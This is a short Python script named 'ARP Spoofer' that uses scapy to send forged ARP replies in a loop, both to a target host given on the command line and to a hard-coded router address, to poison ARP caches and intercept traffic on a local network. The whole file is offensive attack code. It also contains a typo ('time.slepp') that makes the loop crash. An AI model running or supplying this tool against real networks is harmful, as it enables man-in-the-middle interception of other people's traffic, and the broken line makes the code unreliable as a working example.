#!/usr/bin/env python3

import argparse
import time
import scapy.all as scapy

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to Spoof")
    
    return parser.parse_args()
    
def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
    scapy.send(arp_packet, verbose=False)


def main():
    arguments = get_arguments()
    
    while True:
        spoof(arguments.ip_address, "192.168.1.1") # 192.168.1.1 --> IP del router
        spoof("192.168.1.1", arguments.ip_address)
        
        time.slepp(2)
    
if __name__ == '__main__':
    main()
        
        